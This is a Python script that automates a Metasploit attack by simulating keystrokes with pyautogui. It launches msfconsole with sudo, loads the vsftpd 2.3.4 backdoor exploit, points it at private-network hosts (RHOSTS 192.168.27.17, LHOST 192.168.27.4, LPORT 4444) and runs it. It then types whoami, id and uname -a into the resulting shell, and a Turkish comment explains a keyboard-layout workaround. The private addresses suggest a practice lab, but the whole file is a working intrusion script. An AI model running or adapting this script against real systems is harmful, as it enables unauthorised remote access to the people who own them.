#!/usr/bin/python3

import threading,pyautogui
import os,time

def calis():
        os.system("sudo msfconsole")


def worker():
        time.sleep(21)
        pyautogui.write('search vsftpd', interval=0.05)
        pyautogui.press('enter')
        time.sleep(3)

        pyautogui.write("use exploit{unix{ftp{vsftpd_234_backdoor", interval=0.05)
        pyautogui.press('enter')  # Modul secerken "{" karakteri yerine "/" karakteri yazilmaktadir.
        time.sleep(1)
        pyautogui.write('show options', interval=0.05)
        pyautogui.press('enter')
        time.sleep(2)

        pyautogui.write('set RHOSTS 192.168.27.17', interval=0.05)
        pyautogui.press('enter')
        time.sleep(1)

        pyautogui.write('set LHOST 192.168.27.4', interval=0.05)
        pyautogui.press('enter')
        time.sleep(1)

        pyautogui.write('set LPORT 4444', interval=0.05)
        pyautogui.press('enter')
        time.sleep(1)

        pyautogui.write('show targets', interval=0.05)
        pyautogui.press('enter')
        time.sleep(1)



        pyautogui.write('exploit', interval=0.05)
        pyautogui.press('enter')



def son():

        time.sleep(55)
        pyautogui.write('whoami', interval=0.05)
        pyautogui.press('enter')
        time.sleep(1)

        pyautogui.write('id', interval=0.05)
        pyautogui.press('enter')
        time.sleep(1)

        pyautogui.write('uname -a', interval=0.05)
        pyautogui.press('enter')
        time.sleep(1)


w = threading.Thread(target = calis)
t = threading.Thread(target = worker)
z = threading.Thread(target = son)

w.start()
t.start()
z.start()
